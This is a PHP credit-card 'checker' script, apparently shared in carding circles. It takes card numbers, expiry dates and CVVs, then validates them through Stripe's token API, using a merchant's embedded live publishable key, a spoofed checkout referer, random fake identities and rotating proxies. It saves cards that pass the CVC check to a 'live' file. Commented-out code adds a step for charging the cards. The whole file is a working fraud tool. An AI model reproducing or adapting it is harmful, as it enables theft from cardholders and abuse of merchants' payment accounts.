<?php

////////////////////////////===[https://huntsvillefestival.ca/donate/]
/// Every thing is done Now ADD Proxies in Proxy.txt file and use

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$proxy = $_GET['proxy'];
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];


function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function binsforeveryoneproxys()
{
  $poxySocks = file("Proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = binsforeveryoneproxys();

////////////////////////////===[Randomizing Details Api]

function RandomString($length = 23) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function emailGenerate($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString.'@olxbg.cf';
}

$email = urlencode(emailGenerate());
$name = RandomString();
$lastname = RandomString();

////////////////////////////===[Luminati Details]

$username = 'Put Zone Username Here';
$password = 'Put Zone Password Here';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';

////////////////////////////===[For Authorizing Cards]


/////////========Luminati
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");

/////////========scraperapi


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens'); ////This may differ from site to site
curl_setopt($ch, CURLOPT_PROXY, "http://scraperapi:5bf0661ece6024b5f4dd429c1af2f591@proxy-server.scraperapi.com:8001");

curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
////////=========Socks Proxy'
//curl_setopt($ch, CURLOPT_PROXY, $proxy);

curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json', 
'accept-encoding: gzip, deflate, br',
'content-type: application/x-www-form-urlencoded',
'origin: https://checkout.stripe.com',
'referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=ae683113-58e2-19cd-a4b3-c1d90b12e9af',
//// Referer is the most important thing 
////if api dead change referer
'sec-fetch-mode: cors',
'sec-fetch-site: same-site', //));//// Always check sec
'user-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='. $email .'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fwww.ed.org.nz%2Fpage%2F556429%2Fshopping%2Fcart%2Fbillpay-process.html&pasted_fields=number&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]='.$name.'&time_on_page=68129&guid=NA&muid=da073be3-8253-47b8-af93-e6f1731b3e6c&sid=5b7de59d-72e5-4fc6-924b-f251570a149c&key=pk_live_2F5UXELBwdnhtb03v4IJT1Ux0022USoGsG');
/// now replace cc number and details

$result = curl_exec($ch);

//[For Charging Cards]-[If U Want To Charge Your Card Uncomment And Add Site]

// $ch = curl_init();
// /////////========Luminati
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
// ////////=========Socks Proxy

// //curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
// curl_setopt($ch, CURLOPT_URL, '#');
// curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
// curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
// curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
// curl_setopt($ch, CURLOPT_HTTPHEADER, array(
//   'Host: '#',    [If No Host Data On Site Dont Uncomment It]  
//   'accept: '#',
//   'content-type: #',
//   'cookie: #',   [If No Cookie Data On Site Dont Uncomment It]
//   'Origin: #',
//   'referer: #',
//   'Sec-Fetch-Mode: #',
// ));
// curl_setopt($ch, CURLOPT_POSTFIELDS, '#');

// $result = curl_exec($ch);
// $message = trim(strip_tags(getStr($result,'"message":"','"'))); 

////////////////////////////===[Card Response]

//$splited = explode(':',$proxy);

//if($fp = fsockopen($splited[0],$splited[1],$errCode,$errStr,10)){   

// If proxy worked 

$cvv = GetStr($result, '"cvc_check":', ',');
$code = GetStr($result, '"code":', ',');
$message = GetStr($result, '"message":', ',');
$dcode = GetStr($result, '"decline_code":', ',');

$cvvresponse = str_replace('"', '', $cvv);
$coderesponse = str_replace('"', '', $code);
$messageresponse = str_replace('"', '', $message);
$dcoderesponse = str_replace('"', '', $dcode);

if (strpos($result, '"cvc_check": "pass"')) {
   fwrite(fopen('pleks_live_cc_storage.txt', 'a'), $lista."\r\n");
   echo '<div class="alert alert-success">';
   echo '<p align="justify"><strong>#Aprovada</strong>: ' . $lista . ' [Approved, cvc_check:'. $cvvresponse .']</p>';
   echo '</div>';
} elseif (strpos($result, '"code": "incorrect_cvc"')){
echo '<div class="alert alert-success">';
   echo '<p align="justify"><strong>#Aprovada</strong>: ' . $lista . ' [Approved, code:'. $coderesponse .'] [Message: '.$messageresponse.']</p>';
   echo '</div>';
}elseif (strpos($result, '"cvc_check": "unchecked"')) {
   echo '<div class="alert alert-danger">';
 echo '<p align="justify"><strong>#Reprovadas</strong>: ' . $lista .' [Message: Error! Please change your proxy. cvc_check:'.$cvv.'] [Code: '. $coderesponse .'] [Dcode:'. $dcoderesponse .']</p>';
 echo '</div>';	
}elseif (strpos($result, '"cvc_check": "unavailable"')) {
   echo '<div class="alert alert-danger">';
 echo '<p align="justify"><strong>#Reprovadas</strong>: ' . $lista .' [Message: Error! Please change your proxy. cvc_check:'.$cvv.'] [Code: '. $coderesponse .'] [Dcode:'. $dcoderesponse .']</p>';
 echo '</div>';	
}
else {

 echo '<div class="alert alert-danger">';
 echo '<p align="justify"><strong>#Reprovadas</strong>: ' . $lista .' [Message: '.$messageresponse.'] [Code: '. $coderesponse .'] [Dcode:'. $dcoderesponse .']</p>';
 echo '</div>';	
}

/*}else{
  echo '<div class="alert alert-danger">';
  echo '<p align="justify"><strong>#Reprovadas</strong>: ' . $lista . ' [Message: '.$errStr.'][Code: '.$errCode.']</p>';
  echo '</div>';
	
}*/
//fclose($fp);

curl_close($ch);
ob_flush();
//////=========Comment Echo $result If U Want To Hide Site Side Response
echo $result;

///////////////////////////////////////////////===========================Edited By Papa P================================================\\\\\\\\\\\\\\\
?>
